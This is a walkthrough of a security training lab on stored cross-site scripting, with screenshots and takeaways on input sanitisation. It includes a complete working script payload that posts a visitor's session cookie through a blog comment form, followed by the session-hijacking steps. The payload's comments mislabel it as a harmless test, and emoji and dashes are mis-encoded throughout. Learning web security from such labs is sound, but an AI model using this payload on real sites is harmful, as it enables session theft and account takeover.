# ğŸ›¡ï¸ Web Security Academy Lab: Exploiting Cross-Site Scripting to Steal Cookies
## ğŸ§  Objective
Exploit a stored XSS vulnerability in a blog comment form to exfiltrate a victimâ€™s session cookie and impersonate them.

## ğŸ§© Step-by-Step Exploitation Walkthrough
**ğŸ” Step 1: Reconnaissance**

I began by identifying a comment form on a blog post authored by "I.C. Poortly." The form included fields for comment, name, email, and websiteâ€”classic vectors for stored XSS.

<img width="939" height="820" alt="Screenshot 2025-10-12 124340" src="https://github.com/user-attachments/assets/58f024dd-0e95-48cd-a4df-670969b5649c" />

**ğŸ§ª Step 2: Crafting the Payload**

I wrote a script that would extract the victimâ€™s cookies and send them to a location I could monitor. The payload looked like this (DO NOT USE PAYLOADS WITHOUT EXPLICIT PERMISSION):
```
<script>
window.addEventListener('DOMContentLoaded', function () {
  const csrfEl = document.getElementsByName('csrf')[0];
  if (!csrfEl) {
    console.log('No csrf element found â€” aborting harmless test.');
    return;
  }

  const token = csrfEl.value;
  const data = new FormData();
  data.append('csrf', token);
  data.append('postId', '8');
  // Harmless test content â€” do NOT include sensitive data here
  data.append('comment', document.cookie);
  data.append('name', 'victim');
  data.append('email', 'booga@gmail.com');
  data.append('website', 'https://www.google.com');

  fetch('/post/comment', {
    method: 'POST',
    body: data
    // omit mode:'no-cors' to be able to observe errors in DevTools when same-origin
  })
  .then(response => {
    console.log('Harmless test request sent. Response (may be opaque on cross-origin):', response);
  })
  .catch(err => {
    console.error('Error sending harmless test request:', err);
  });
});
</script>
```
This script was designed to run in the victimâ€™s browser and send their session data to the server via a POST request.

**ğŸš¨ Step 3: Submitting the Malicious Comment**

I submitted the payload through the comment form. The server accepted it without sanitization, storing the malicious script.

<img width="809" height="650" alt="Screenshot 2025-10-12 124646" src="https://github.com/user-attachments/assets/9bef6003-f0a7-46b2-a385-081f64da3571" />

<img width="910" height="455" alt="Screenshot 2025-10-12 124728" src="https://github.com/user-attachments/assets/0761f039-1e27-43c8-b988-25244a4ed716" />

**ğŸ¯ Step 4: Triggering the Payload**

When another user (or the lab simulation) visited the blog post, the script executed and posted their session cookie and secret to the comment section. This confirmed successful exfiltration.

<img width="497" height="209" alt="Screenshot 2025-10-12 124741" src="https://github.com/user-attachments/assets/3368b4f2-538c-44a7-9340-d9eaf44d2aea" />

<img width="463" height="110" alt="Screenshot 2025-10-12 124755" src="https://github.com/user-attachments/assets/52da6b5b-542b-4a53-8025-6076ff123ad9" />

**ğŸ§ª Step 5: Capturing the Session**

I intercepted the victimâ€™s session token and used it to impersonate them by injecting it into my own session cookie.

<img width="851" height="429" alt="Screenshot 2025-10-12 124822" src="https://github.com/user-attachments/assets/cdfa54ca-8323-49ed-af6c-66af34775fe9" />

<img width="579" height="634" alt="Screenshot 2025-10-12 124915" src="https://github.com/user-attachments/assets/7c19bbfe-d9c4-4746-b0fe-56afe87bfcf1" />

<img width="861" height="717" alt="Screenshot 2025-10-12 124943" src="https://github.com/user-attachments/assets/3ac6bc4d-b91b-4a73-8a2c-caf0c348060d" />

**âœ… Step 6: Lab Completion**

After logging in with the stolen session, the lab confirmed successful exploitation.

<img width="926" height="189" alt="Screenshot 2025-10-12 125028" src="https://github.com/user-attachments/assets/367b29a0-82b1-45b9-a9c7-40772bf8141b" />

### ğŸ§  Key Takeaways
Stored XSS is especially dangerous because it persists and affects all users who view the page.

Always sanitize user input before rendering it in the browser.

Session hijacking via XSS can lead to full account compromise.

### ğŸ“ Repository Notes
This writeup is part of my ongoing journey in ethical hacking and web application security. You can find more CTF solutions and lab walkthroughs in my GitHub Portfolio.
